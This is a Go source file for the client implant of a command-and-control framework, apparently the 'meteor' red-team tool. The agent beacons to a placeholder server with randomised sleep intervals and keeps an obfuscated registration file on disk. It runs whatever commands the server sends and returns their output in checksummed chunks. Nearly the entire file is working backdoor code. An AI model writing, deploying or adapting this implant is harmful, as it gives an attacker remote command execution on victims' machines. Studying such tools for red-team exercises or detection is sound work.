package main

import (
	"encoding/base64"
	"fmt"
	agentUtils "github.com/degenerat3/meteor/agents/utils"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"math/rand"
	"net"
	"os"
	"time"
)

// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
var SERVER = "$$SERVER$$"

// INTERVAL is how long to sleep between callbacks
var INTERVAL = 1234123499

// DELTA is the jitter/variation in interval per cycle
var DELTA = 4321432199

// REGFILE is the path to the disk location where the registration file will be kept (ex: `/etc/botconf.txt`)
var REGFILE = "$$REGFILE$$"

// OBFTEXT is the obfuscation text that will be used when generating the regfile
var OBFTEXT = "$$OBFTEXT$$"

// DEBUG specifies if execution of the client will write output
var DEBUG = false

var cachedSID int32        // the SID from the previous packet sent
var cachedPyld []byte      // the payload from the previous packet sent
var cachedChk []byte       // the checksum from the previous packet sent
var cachedFlg mcs.CTP_Flag // the flag from the previous packet sent
var rData []byte           // content received
var tData [][]byte         // content to send, split into chunks
var splitSize = 1024

func main() {
	if len(os.Args) != 2 && len(os.Args) != 3 {
		if DEBUG {
			fmt.Println("Executed without arguments, exiting...")
		}
		os.Exit(0)
	}
	for {
		var payload string
		regstat := agentUtils.CheckRegStatus(REGFILE)
		if DEBUG {
			fmt.Printf("RegStat: %t\n", regstat)
		}
		if regstat {
			payload = agentUtils.GenCheckin(REGFILE, OBFTEXT)
		} else {
			payload = agentUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
		}
		if DEBUG {
			fmt.Printf("Payload: %s\n", payload)
		}

		communicate(payload)

		if DEBUG {
			fmt.Printf("Got response: %s\n", rData)
		}
		decoded, err := base64.StdEncoding.DecodeString(string(rData))
		rData = []byte("")
		if DEBUG {
			if err != nil {
				fmt.Println("Error decoding response: " + err.Error())
				endCheck()
			}
			fmt.Printf("Decoded: %s\n", decoded)
		}
		resp := &mcs.MCS{}
		err = proto.Unmarshal(decoded, resp)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		stat := resp.GetStatus()
		if DEBUG {
			fmt.Printf("Recd status: %d\n", stat)
		}
		if stat == 204 { // no actions rec'd
			endCheck()
			continue
		}
		actions := resp.GetActions()
		for _, acn := range actions {
			uid := acn.GetUuid()
			if DEBUG {
				fmt.Printf("Handling action: %s\n", uid)
			}
			mod := acn.GetMode()
			args := acn.GetArgs()
			acnOut := agentUtils.ExecCommand(mod, args)
			acnData := agentUtils.GenAddResult(uid, acnOut)
			communicate(acnData)

			if DEBUG {
				fmt.Printf("Got response: %s\n", rData)
			}
			decoded, err := base64.StdEncoding.DecodeString(string(rData))
			rData = []byte("")
			if DEBUG {
				if err != nil {
					fmt.Println("Error decoding response: " + err.Error())
					endCheck()
				}
				fmt.Printf("Decoded: %s\n", decoded)
			}
		}
		endCheck()

	}
}

func endCheck() {
	if DEBUG {
		fmt.Printf("Checking if program should exit...\n")
	}
	if len(os.Args) == 3 {
		os.Exit(0)
	}
	min := INTERVAL - DELTA
	max := INTERVAL + DELTA
	sleeptime := rand.Intn(max-min) + min
	if DEBUG {
		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
	}
	time.Sleep(time.Duration(sleeptime) * time.Second)
}

func genInit() (int32, []byte, []byte, mcs.CTP_Flag) {
	sid := rand.Int31()
	var pyld = []byte("newSession")
	var chk = calcChecksum(pyld)
	var flg mcs.CTP_Flag

	return sid, pyld, chk, flg
}

func updateCache(sid int32, pyld []byte, chk []byte, flg mcs.CTP_Flag) {
	cachedSID = sid
	cachedPyld = pyld
	cachedChk = chk
	cachedFlg = flg
	return
}

func communicate(payload string) {
	splitPayload([]byte(payload))
	conn := getListener("0.0.0.0")
	dst, _ := net.ResolveIPAddr("ip4", SERVER)
	defer conn.Close()
	sid, pyld, chk, flg := genInit()
	writeToListener(conn, dst, sid, pyld, chk, flg)
	updateCache(sid, pyld, chk, flg)

recvLoop:
	for {
		respProto, peer := readFromListener(conn)
		switch respFlag := respProto.GetTypeFlag(); respFlag {
		case 1: // ack
			switch rcvdPyld := string(respProto.GetPayload()); rcvdPyld {
			case "mAck": //M Data ack, send the next chunk
				sid := respProto.GetSessionId()
				nextChunk, chksm, flg := genNextData()
				updateCache(sid, nextChunk, chksm, flg)
				writeToListener(conn, peer, sid, nextChunk, chksm, flg)
			case "sidack": // server ack'd the sid, send first chunk
				sid := respProto.GetSessionId()
				nextChunk, chksm, flg := genNextData()
				updateCache(sid, nextChunk, chksm, flg)
				writeToListener(conn, peer, sid, nextChunk, chksm, flg)
			}
		case 2: // data
			sid := respProto.GetSessionId()
			match := processMCSData(respProto.GetPayload(), respProto.GetChecksum())
			if match == false { // if our checksum didn't pass, requeset a retransmission
				writeToListener(conn, peer, sid, []byte(""), []byte(""), 4)
				updateCache(sid, []byte(""), []byte(""), 4)
			}
			writeToListener(conn, peer, sid, []byte("mAck"), []byte(""), 1) // if checksum passed, ack it
			updateCache(sid, []byte("mAck"), []byte(""), 1)
		case 3: // fin
			sid := respProto.GetSessionId()
			updateCache(sid, []byte("finack"), []byte(""), 1)
			writeToListener(conn, peer, sid, []byte("finack"), []byte(""), 1)
			break recvLoop
		case 4: // retrans
			sid := respProto.GetSessionId()
			writeToListener(conn, peer, sid, cachedPyld, cachedChk, cachedFlg)
		}
	}
	return
}

func splitPayload(pyld []byte) {
	var chunks [][]byte
	for {
		if len(pyld) > splitSize {
			chnk := pyld[0:splitSize]
			chunks = append(chunks, chnk)
			pyld = pyld[splitSize:]
		} else {
			chunks = append(chunks, pyld)
			break
		}
	}
	tData = chunks
	return
}

func getNextChunk() []byte {
	if len(tData) > 0 {
		next := tData[0]
		if len(tData) >= 1 {
			tData = tData[1:]
		}
		return next
	}
	return []byte("")

}

func genNextData() ([]byte, []byte, mcs.CTP_Flag) {
	pyld := getNextChunk()
	if len(pyld) == 0 {
		return []byte(""), []byte(""), 3 // send a FIN if we're done
	}
	chk := calcChecksum(pyld)
	return pyld, chk, 2 // send next chunk as DATA
}

func processMCSData(pyld []byte, chk []byte) bool {
	myChk := calcChecksum(pyld)
	if match := compareChks(myChk, chk); match == false {
		return false
	}
	rData = append(rData, pyld...)
	return true
}
